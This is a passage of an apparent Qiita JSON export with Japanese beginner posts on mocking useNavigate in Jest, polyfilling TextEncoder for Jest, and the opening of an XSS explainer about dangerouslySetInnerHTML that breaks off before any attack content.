class=\"p\">&gt;</span>\n              <span class=\"p\">&lt;</span><span class=\"nc\">CardBody</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;</span><span class=\"nc\">Box</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nc\">Heading</span> <span class=\"na\">as</span><span class=\"p\">=</span><span class=\"s\">\"h1\"</span> <span class=\"na\">size</span><span class=\"p\">=</span><span class=\"s\">\"lg\"</span> <span class=\"na\">mb</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"mi\">4</span><span class=\"si\">}</span> <span class=\"na\">data-testid</span><span class=\"p\">=</span><span class=\"s\">\"name\"</span><span class=\"p\">&gt;</span>\n                    <span class=\"si\">{</span><span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nx\">name</span><span class=\"si\">}</span>\n                  <span class=\"p\">&lt;/</span><span class=\"nc\">Heading</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;/</span><span class=\"nc\">Box</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;</span><span class=\"nc\">Box</span> <span class=\"na\">mb</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"mi\">2</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nc\">Heading</span> <span class=\"na\">as</span><span class=\"p\">=</span><span class=\"s\">\"h2\"</span> <span class=\"na\">size</span><span class=\"p\">=</span><span class=\"s\">\"md\"</span><span class=\"p\">&gt;</span>\n                    好きな技術\n                  <span class=\"p\">&lt;/</span><span class=\"nc\">Heading</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">data-testid</span><span class=\"p\">=</span><span class=\"s\">\"favorite_skill\"</span><span class=\"p\">&gt;</span><span class=\"si\">{</span><span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nx\">skill_name</span><span class=\"si\">}</span><span class=\"p\">&lt;/</span><span class=\"nt\">div</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;/</span><span class=\"nc\">Box</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;</span><span class=\"nc\">Box</span> <span class=\"na\">display</span><span class=\"p\">=</span><span class=\"s\">\"flex\"</span> <span class=\"na\">justifyContent</span><span class=\"p\">=</span><span class=\"s\">\"center\"</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nc\">Box</span> <span class=\"na\">w</span><span class=\"p\">=</span><span class=\"s\">\"33%\"</span> <span class=\"na\">textAlign</span><span class=\"p\">=</span><span class=\"s\">\"center\"</span><span class=\"p\">&gt;</span>\n                    <span class=\"p\">&lt;</span><span class=\"nt\">a</span> <span class=\"na\">href</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">getGithubUrl</span><span class=\"p\">(</span><span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nx\">github_id</span><span class=\"p\">)</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n                      <span class=\"p\">&lt;</span><span class=\"nc\">IoLogoGithub</span> <span class=\"na\">data-testid</span><span class=\"p\">=</span><span class=\"s\">\"github-icon\"</span> <span class=\"na\">fontSize</span><span class=\"p\">=</span><span class=\"s\">\"40px\"</span> <span class=\"p\">/&gt;</span>\n                    <span class=\"p\">&lt;/</span><span class=\"nt\">a</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;/</span><span class=\"nc\">Box</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nc\">Box</span> <span class=\"na\">w</span><span class=\"p\">=</span><span class=\"s\">\"33%\"</span> <span class=\"na\">textAlign</span><span class=\"p\">=</span><span class=\"s\">\"center\"</span><span class=\"p\">&gt;</span>\n                    <span class=\"p\">&lt;</span><span class=\"nt\">a</span> <span class=\"na\">href</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">getQiitaUrl</span><span class=\"p\">(</span><span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nx\">qiita_id</span><span class=\"p\">)</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n                      <span class=\"p\">&lt;</span><span class=\"nc\">SiQiita</span> <span class=\"na\">data-testid</span><span class=\"p\">=</span><span class=\"s\">\"qiita-icon\"</span> <span class=\"na\">fontSize</span><span class=\"p\">=</span><span class=\"s\">\"40px\"</span> <span class=\"p\">/&gt;</span>\n                    <span class=\"p\">&lt;/</span><span class=\"nt\">a</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;/</span><span class=\"nc\">Box</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;</span><span class=\"nc\">Box</span> <span class=\"na\">w</span><span class=\"p\">=</span><span class=\"s\">\"33%\"</span> <span class=\"na\">textAlign</span><span class=\"p\">=</span><span class=\"s\">\"center\"</span><span class=\"p\">&gt;</span>\n                    <span class=\"p\">&lt;</span><span class=\"nt\">a</span> <span class=\"na\">href</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">getXUrl</span><span class=\"p\">(</span><span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nx\">x_id</span><span class=\"p\">)</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n                      <span class=\"p\">&lt;</span><span class=\"nc\">RiTwitterXFill</span> <span class=\"na\">data-testid</span><span class=\"p\">=</span><span class=\"s\">\"x-icon\"</span> <span class=\"na\">fontSize</span><span class=\"p\">=</span><span class=\"s\">\"40px\"</span> <span class=\"p\">/&gt;</span>\n                    <span class=\"p\">&lt;/</span><span class=\"nt\">a</span><span class=\"p\">&gt;</span>\n                  <span class=\"p\">&lt;/</span><span class=\"nc\">Box</span><span class=\"p\">&gt;</span>\n                <span class=\"p\">&lt;/</span><span class=\"nc\">Box</span><span class=\"p\">&gt;</span>\n              <span class=\"p\">&lt;/</span><span class=\"nc\">CardBody</span><span class=\"p\">&gt;</span>\n            <span class=\"p\">&lt;/</span><span class=\"nc\">Card</span><span class=\"p\">&gt;</span>\n          <span class=\"p\">);</span>\n        <span class=\"p\">})</span><span class=\"si\">}</span>\n      <span class=\"p\">&lt;/</span><span class=\"nc\">Box</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nc\">Box</span> <span class=\"na\">width</span><span class=\"p\">=</span><span class=\"s\">\"sm\"</span> <span class=\"na\">p</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"mi\">4</span><span class=\"si\">}</span> <span class=\"na\">textAlign</span><span class=\"p\">=</span><span class=\"s\">\"center\"</span><span class=\"p\">&gt;</span>\n        <span class=\"p\">&lt;</span><span class=\"nc\">Button</span>\n          <span class=\"na\">w</span><span class=\"p\">=</span><span class=\"s\">\"100%\"</span>\n          <span class=\"na\">mt</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"mi\">4</span><span class=\"si\">}</span>\n          <span class=\"na\">colorScheme</span><span class=\"p\">=</span><span class=\"s\">\"teal\"</span>\n          <span class=\"na\">data-testid</span><span class=\"p\">=</span><span class=\"s\">\"remove-button\"</span>\n          <span class=\"na\">onClick</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">navigate</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">/</span><span class=\"dl\">\"</span><span class=\"p\">)</span><span class=\"si\">}</span>\n        <span class=\"p\">&gt;</span>\n          戻る\n        <span class=\"p\">&lt;/</span><span class=\"nc\">Button</span><span class=\"p\">&gt;</span>\n      <span class=\"p\">&lt;/</span><span class=\"nc\">Box</span><span class=\"p\">&gt;</span>\n    <span class=\"p\">&lt;/</span><span class=\"nc\">Box</span><span class=\"p\">&gt;</span>\n  <span class=\"p\">);</span>\n<span class=\"p\">};</span>\n\n</code></pre></div>\n</div>\n</details>\n<h1 data-sourcepos=\"227:1-227:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"228:1-229:116\">関数が何を返すのかも意識して、テストしないといけないと思いました。<br>\n今回エラーに向き合えたことで、他のHooksでモック化する際にも応用ができそうです。</p>\n<h1 data-sourcepos=\"231:1-231:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"233:1-233:53\"><iframe id=\"qiita-embed-content__522dd88a9b84350c67ff7c3ffbc22e0b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__522dd88a9b84350c67ff7c3ffbc22e0b\" data-content=\"https%3A%2F%2Fqiita.com%2Fshiva_it%2Fitems%2F48e92101a31e4a2ba50d\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"235:1-235:65\"><iframe id=\"qiita-embed-content__22f1af3c40a82229b9208508cc8933c0\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__22f1af3c40a82229b9208508cc8933c0\" data-content=\"https%3A%2F%2Fjestjs.io%2Fja%2Fdocs%2Fjest-object%23jestrequireactualmodulename\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nuseNavigateを使用しているコンポネーントのテストを行う際に、useNavigateのモック化が理解できず、テスト実行時にエラーとなりました。useNavigateのモック化方法をまとめてみました。\n\n# 問題\nuseNavigateのモック化してテスト実行すると下記のエラーが発生しました。\n\n```shell\n● UserCard › 戻るボタンをクリックすると/に遷移すること\n    expect(jest.fn()).toHaveBeenCalledWith(...expected)\n    Expected: \"/\"\n    Received\n           1: called with 0 arguments\n           2: called with 0 arguments\n    Number of calls: 2\n      84 |     await userEvent.click(removeButton);\n      85 |\n    > 86 |     expect(useNavigate).toHaveBeenCalledWith(\"/\");\n         |                         ^\n      87 |   });\n      88 | });\n      89 |\n      at Object.<anonymous> (src/tests/userCardComponent.spec.tsx:86:25)\n PASS  src/tests/sampleComponent.spec.tsx\n\nTest Suites: 1 failed, 1 passed, 2 total                                                                                                                                                                                  \nTests:       1 failed, 7 passed, 8 total\nSnapshots:   0 total\nTime:        1.923 s\n```\n\n# 原因\n`useNavigate`自体をモック関数にしてしまっていました。\n\n### React Router の useNavigate は 関数を返す関数\n`useNavigate`は関数を返す関数であることを理解できていませんでした。\n\nテスト対象のコンポーネントでは確かに返却された関数をnavigateに格納して使用していました。\n\n```tsx\nconst navigate = useNavigate(); // useNavigateで返却された関数をnavigateに格納\nexport const UserCard = () => {\n  return (\n    <Button\n      w=\"100%\"\n      mt={4}\n      colorScheme=\"teal\"\n      data-testid=\"remove-button\"\n      onClick={() => navigate(\"/\")}  // navigateで実行！\n    >\n      戻る\n    </Button>\n  );\n};\n```\n\n実際に書いていたテスト\n```tsx\njest.mock(\"react-router\", () => ({\n  ...jest.requireActual(\"react-router\"),\n  useNavigate: jest.fn(), // これだとuseNavigate()がモック関数になり、使用時はundefinedを返す\n}));\n```\n\n# 解決方法\nモック関数（mockNavigate）を別途作り、useNavigateが呼ばれた際はモック関数を呼ぶようにしました。\n\n```diff_tsx\n+const mockNavigate = jest.fn();\njest.mock(\"react-router\", () => ({\n  ...jest.requireActual(\"react-router\"),\n+  useNavigate: () => mockNavigate,\n-   useNavigate: jest.fn(),\n}));\n```\n\n1. mockNavigate というモック関数を作成\n2. `...jest.requireActual(\"react-router\"),`：`jest.requireActual(\"react-router\")`でreact-routerの全てのモジュールをエクスポート、`...`（スプレッド構文）でコピー\n3. useNavigate が呼ばれたときに mockNavigate を返すようにする\n4. コンポーネントでは const navigate = useNavigate() と書かれており、navigate には mockNavigate が入る\n4. navigate(\"/\") が呼ばれると、実際には mockNavigate(\"/\") が実行される\n\n**完成系**\n\n<details><summary>テストコード</summary>\n\n```tsx:test.tsx\njest.mock(\"../utils/supabaseFunctions\", () => ({\n  getUserById: jest.fn(),\n}));\n\nconst mockNavigate = jest.fn();\njest.mock(\"react-router\", () => ({\n  ...jest.requireActual(\"react-router\"),\n  useNavigate: () => mockNavigate,\n}));\n\n// モックデータを作成\nconst mockUser = {\n  id: \"apple\",\n  name: \"テストユーザー\",\n  description: \"<p>テストユーザーの説明</p>\",\n  skill_name: \"React\",\n  github_id: \"testuser\",\n  qiita_id: \"testuser\",\n  x_id: \"testuser\",\n  getGithubUrl: jest.fn(() => \"https://github.com/testuser\"),\n  getQiitaUrl: jest.fn(() => \"https://qiita.com/testuser\"),\n  getXUrl: jest.fn(() => \"https://x.com/testuser\"),\n};\n\nbeforeEach(() => {\n  jest.clearAllMocks();\n  // DBから取得したデータをモックする\n  (getUserById as jest.Mock).mockResolvedValue([mockUser]);\n});\n\ndescribe(\"UserCard\", () => {\n  it(\"戻るボタンをクリックすると/に遷移すること\", async () => {\n    render(<UserCard />, { wrapper: BrowserRouter });\n\n    // 戻るボタンをクリック\n    const removeButton = await screen.findByTestId(\"remove-button\");\n    await userEvent.click(removeButton);\n\n    expect(mockNavigate).toHaveBeenCalledWith(\"/\");\n  });\n});\n```\n\n</details>\n\n<details><summary>テスト対象のコンポーネント</summary>\n\n```tsx:UserCard.tsx\nimport { useEffect, useState } from \"react\";\nimport { useNavigate, useParams } from \"react-router\";\nimport { getUserById } from \"../utils/supabaseFunctions\";\nimport { User } from \"../domain/user\";\nimport { Box, Button, Card, CardBody, Heading } from \"@chakra-ui/react\";\nimport { IoLogoGithub } from \"react-icons/io5\";\nimport { SiQiita } from \"react-icons/si\";\nimport { RiTwitterXFill } from \"react-icons/ri\";\n\nexport const UserCard = () => {\n  const { id } = useParams();\n  const [loadingFlag, setLoadingFlag] = useState(true);\n  const [user, setUser] = useState<User[]>();\n  const navigate = useNavigate();\n  const getData = async () => {\n    const data = await getUserById(id!);\n    setUser(data);\n    if (data.length !== 0) {\n      setLoadingFlag(false);\n    }\n  };\n  useEffect(() => {\n    getData();\n  }, []);\n  if (loadingFlag) {\n    return <h1>loading…</h1>;\n  }\n  return (\n    <Box\n      height=\"100vh\"\n      display=\"flex\"\n      flexDirection=\"column\"\n      alignItems=\"center\"\n      justifyContent=\"center\"\n      bg=\"#C4F1F9\"\n    >\n      <Box width=\"sm\" p={4}>\n        {user?.map((user) => {\n          return (\n            <Card key={user.id}>\n              <CardBody>\n                <Box>\n                  <Heading as=\"h1\" size=\"lg\" mb={4} data-testid=\"name\">\n                    {user.name}\n                  </Heading>\n                </Box>\n                <Box mb={2}>\n                  <Heading as=\"h2\" size=\"md\">\n                    好きな技術\n                  </Heading>\n                  <div data-testid=\"favorite_skill\">{user.skill_name}</div>\n                </Box>\n                <Box display=\"flex\" justifyContent=\"center\">\n                  <Box w=\"33%\" textAlign=\"center\">\n                    <a href={user.getGithubUrl(user.github_id)}>\n                      <IoLogoGithub data-testid=\"github-icon\" fontSize=\"40px\" />\n                    </a>\n                  </Box>\n                  <Box w=\"33%\" textAlign=\"center\">\n                    <a href={user.getQiitaUrl(user.qiita_id)}>\n                      <SiQiita data-testid=\"qiita-icon\" fontSize=\"40px\" />\n                    </a>\n                  </Box>\n                  <Box w=\"33%\" textAlign=\"center\">\n                    <a href={user.getXUrl(user.x_id)}>\n                      <RiTwitterXFill data-testid=\"x-icon\" fontSize=\"40px\" />\n                    </a>\n                  </Box>\n                </Box>\n              </CardBody>\n            </Card>\n          );\n        })}\n      </Box>\n      <Box width=\"sm\" p={4} textAlign=\"center\">\n        <Button\n          w=\"100%\"\n          mt={4}\n          colorScheme=\"teal\"\n          data-testid=\"remove-button\"\n          onClick={() => navigate(\"/\")}\n        >\n          戻る\n        </Button>\n      </Box>\n    </Box>\n  );\n};\n\n```\n</details>\n\n# おわりに\n関数が何を返すのかも意識して、テストしないといけないと思いました。\n今回エラーに向き合えたことで、他のHooksでモック化する際にも応用ができそうです。\n\n# 参考\n\nhttps://qiita.com/shiva_it/items/48e92101a31e4a2ba50d\n\nhttps://jestjs.io/ja/docs/jest-object#jestrequireactualmodulename\n\n","coediting":false,"comments_count":0,"created_at":"2025-05-10T10:43:41+09:00","group":null,"id":"ccd290c8b5869b41b20d","likes_count":1,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"Mock","versions":[]},{"name":"Jest","versions":[]},{"name":"react-router","versions":[]},{"name":"useNavigate","versions":[]}],"title":"【react-router + Jest】useNavigateをJestでモック化できない","updated_at":"2025-05-10T10:43:41+09:00","url":"https://qiita.com/asa129/items/ccd290c8b5869b41b20d","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":522,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:87\">テストを実行しようとした際に、表題のエラーが発生しました。</p>\n<h1 data-sourcepos=\"4:1-4:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"6:1-21:3\"><div class=\"highlight\"><pre><code>● Test suite failed to run\n\n    ReferenceError: TextEncoder is not defined\n\n      1 | import <span class=\"o\">{</span> useEffect, useState <span class=\"o\">}</span> from <span class=\"s2\">\"react\"</span><span class=\"p\">;</span>\n    <span class=\"o\">&gt;</span> 2 | import <span class=\"o\">{</span> useNavigate, useParams <span class=\"o\">}</span> from <span class=\"s2\">\"react-router\"</span><span class=\"p\">;</span>\n        | ^\n      3 | import <span class=\"o\">{</span> getUserById <span class=\"o\">}</span> from <span class=\"s2\">\"../utils/supabaseFunctions\"</span><span class=\"p\">;</span>\n      4 | import <span class=\"o\">{</span> User <span class=\"o\">}</span> from <span class=\"s2\">\"../domain/user\"</span><span class=\"p\">;</span>\n      5 | import <span class=\"o\">{</span> Box, Button, Card, CardBody, Heading <span class=\"o\">}</span> from <span class=\"s2\">\"@chakra-ui/react\"</span><span class=\"p\">;</span>\n\n      at Object.&lt;anonymous&gt; <span class=\"o\">(</span>node_modules/react-router/dist/development/index.js:9351:15<span class=\"o\">)</span>\n      at Object.&lt;anonymous&gt; <span class=\"o\">(</span>src/cards/UserCard.tsx:2:1<span class=\"o\">)</span>\n      at Object.&lt;anonymous&gt; <span class=\"o\">(</span>src/__tests__/userCardComponent.spec.tsx:2:1<span class=\"o\">)</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"23:1-23:8\">\n<span id=\"原因\" class=\"fragment\"></span><a href=\"#%E5%8E%9F%E5%9B%A0\"><i class=\"fa fa-link\"></i></a>原因</h1>\n<p data-sourcepos=\"24:1-24:84\"><code>react-router</code>を導入している環境で、Jestを実行しようとしたため</p>\n<p data-sourcepos=\"26:1-27:152\">テスト環境で react-router を使用する際に、<code>TextEncoder</code>というグローバルオブジェクトが定義されていないことが原因でした。<br>\nTextEncoder は通常ブラウザ環境で利用可能ですが、Node.js の Jest テスト環境ではデフォルトで定義されていません。</p>\n<h3 data-sourcepos=\"29:1-29:21\">\n<span id=\"textencoderとは\" class=\"fragment\"></span><a href=\"#textencoder%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>TextEncoderとは</h3>\n<p data-sourcepos=\"31:1-31:19\"><strong>MDNより引用</strong></p>\n<blockquote data-sourcepos=\"32:1-32:143\">\n<p data-sourcepos=\"32:2-32:143\">TextEncoder はコードポイントのストリームを入力として受け取り、 UTF-8 のバイトストリームを出力します。</p>\n</blockquote>\n<p data-sourcepos=\"34:1-34:89\">文字列をUTF-8形式のバイトデータに変換するものと理解しました。</p>\n<h1 data-sourcepos=\"36:1-36:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<p data-sourcepos=\"37:1-37:197\"><code>jest.setup.ts</code>に<code>TextEncoder</code>と<code>TextDecoder</code>のポリフィル（特定の機能が実行環境に存在しない場合、その機能を後から追加するためのコード）を追加する</p>\n<div class=\"code-frame\" data-lang=\"diff_typescript\" data-sourcepos=\"39:1-50:3\">\n<div class=\"code-lang\"><span class=\"bold\">:jest.setup.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/jest-dom</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">config</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">dotenv</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"hil\"><span class=\"o\">+ </span><span class=\"k\">import</span> <span class=\"nx\">util</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">util</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n</span>\n<span class=\"nf\">config</span><span class=\"p\">();</span>\n\n<span class=\"hil\"><span class=\"o\">+</span><span class=\"c1\">// eslint-disable-next-line @typescript-eslint/no-require-imports</span>\n</span><span class=\"hil\"><span class=\"o\">+</span><span class=\"nb\">global</span><span class=\"p\">.</span><span class=\"nx\">TextEncoder</span> <span class=\"o\">=</span> <span class=\"nx\">util</span><span class=\"p\">.</span><span class=\"nx\">TextEncoder</span><span class=\"p\">;</span>\n</span><span class=\"hil\"><span class=\"o\">+</span><span class=\"c1\">// eslint-disable-next-line @typescript-eslint/no-require-imports</span>\n</span><span class=\"hil\"><span class=\"o\">+</span><span class=\"nb\">global</span><span class=\"p\">.</span><span class=\"nx\">TextDecoder</span> <span class=\"o\">=</span> <span class=\"nx\">util</span><span class=\"p\">.</span><span class=\"nx\">TextDecoder</span><span class=\"p\">;</span>\n</span></code></pre></div>\n</div>\n<h1 data-sourcepos=\"52:1-52:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"53:1-54:57\">今回、初めて使用するライブラリを使ったプロジェクトに対してテストすることに挑戦しています。<br>\n新たなエラーにたくさん出会いそうです。</p>\n<h1 data-sourcepos=\"56:1-56:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"57:1-57:54\"><iframe id=\"qiita-embed-content__391512ffacc7f25eec1deeedafbb1580\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__391512ffacc7f25eec1deeedafbb1580\" data-content=\"https%3A%2F%2Fqiita.com%2Fmasa_code%2Fitems%2F799c028fb7b56d6661a2\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"59:1-59:57\"><iframe id=\"qiita-embed-content__0158ae7753de7e22cac83855319e59bb\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__0158ae7753de7e22cac83855319e59bb\" data-content=\"https%3A%2F%2Fdeveloper.mozilla.org%2Fja%2Fdocs%2FWeb%2FAPI%2FTextEncoder\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nテストを実行しようとした際に、表題のエラーが発生しました。\n\n# 問題\n\n```shell\n● Test suite failed to run\n\n    ReferenceError: TextEncoder is not defined\n\n      1 | import { useEffect, useState } from \"react\";\n    > 2 | import { useNavigate, useParams } from \"react-router\";\n        | ^\n      3 | import { getUserById } from \"../utils/supabaseFunctions\";\n      4 | import { User } from \"../domain/user\";\n      5 | import { Box, Button, Card, CardBody, Heading } from \"@chakra-ui/react\";\n\n      at Object.<anonymous> (node_modules/react-router/dist/development/index.js:9351:15)\n      at Object.<anonymous> (src/cards/UserCard.tsx:2:1)\n      at Object.<anonymous> (src/__tests__/userCardComponent.spec.tsx:2:1)\n```\n\n# 原因\n`react-router`を導入している環境で、Jestを実行しようとしたため\n\nテスト環境で react-router を使用する際に、`TextEncoder`というグローバルオブジェクトが定義されていないことが原因でした。\nTextEncoder は通常ブラウザ環境で利用可能ですが、Node.js の Jest テスト環境ではデフォルトで定義されていません。\n\n### TextEncoderとは\n\n**MDNより引用**\n>TextEncoder はコードポイントのストリームを入力として受け取り、 UTF-8 のバイトストリームを出力します。\n\n文字列をUTF-8形式のバイトデータに変換するものと理解しました。\n\n# 解決方法\n`jest.setup.ts`に`TextEncoder`と`TextDecoder`のポリフィル（特定の機能が実行環境に存在しない場合、その機能を後から追加するためのコード）を追加する\n\n```diff_typescript::jest.setup.ts\nimport \"@testing-library/jest-dom\";\nimport { config } from \"dotenv\";\n+ import util from \"util\";\n\nconfig();\n\n+// eslint-disable-next-line @typescript-eslint/no-require-imports\n+global.TextEncoder = util.TextEncoder;\n+// eslint-disable-next-line @typescript-eslint/no-require-imports\n+global.TextDecoder = util.TextDecoder;\n```\n\n# おわりに\n今回、初めて使用するライブラリを使ったプロジェクトに対してテストすることに挑戦しています。\n新たなエラーにたくさん出会いそうです。\n\n# 参考\nhttps://qiita.com/masa_code/items/799c028fb7b56d6661a2\n\nhttps://developer.mozilla.org/ja/docs/Web/API/TextEncoder\n","coediting":false,"comments_count":0,"created_at":"2025-05-07T22:23:53+09:00","group":null,"id":"83e409a901d2ec61768c","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"Jest","versions":[]},{"name":"react-router","versions":[]}],"title":"【Jest】ReferenceError: TextEncoder is not definedエラーが発生する","updated_at":"2025-05-07T22:23:53+09:00","url":"https://qiita.com/asa129/items/83e409a901d2ec61768c","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":566,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:193\">学習中に<code>dangerouslySetInnerHTML</code>を使用する機会がありました。XSSとは何か、なぜ危険なのかわからなかったため、学んだことをまとめてみました。</p>\n<h1 data-sourcepos=\"4:1-4:31\">\n<span id=\"dangerouslysetinnerhtmlとは\" class=\"fragment\"></span><a href=\"#dangerouslysetinnerhtml%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>dangerouslySetInnerHTMLとは</h1>\n<p data-sourcepos=\"6:1-6:40\"><strong>公式ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"7:1-7:94\">\n<p data-sourcepos=\"7:2-7:94\">以下のように、要素に対して生の HTML 文字列を渡すことができます。</p>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"8:1-11:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">markup</span> <span class=\"o\">=</span> <span class=\"p\">{</span> <span class=\"na\">__html</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">&lt;p&gt;some raw html&lt;/p&gt;</span><span class=\"dl\">'</span> <span class=\"p\">};</span>\n<span class=\"k\">return</span> <span class=\"p\">&lt;</span><span class=\"nt\">div</span> <span class=\"na\">dangerouslySetInnerHTML</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">markup</span><span class=\"si\">}</span> <span class=\"p\">/&gt;;</span>\n</code></pre></div></div>\n<p data-sourcepos=\"13:1-13:118\">公式ドキュメントのタイトルは<strong>危険を冒して内部 HTML をセットする</strong>となっています。</p>\n<blockquote data-sourcepos=\"15:1-15:162\">\n<p data-sourcepos=\"15:2-15:162\">マークアップが完全に信頼できるソースから来ていない限り、この方法を使うといとも簡単に XSS 脆弱性が発生します。</p>\n</blockquote>\n<p data-sourcepos=\"17:1-17:116\">名前にdangerousとつくほど注意が必要な機能です。<strong>XSS 脆弱性</strong>とは何なのでしょうか？</p>\n<h1 data-sourcepos=\"19:1-19:11\">\n<span id=\"xssとは\" class=\"fragment\"></span><a href=\"#xss%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>XSSとは</h1>\n<p 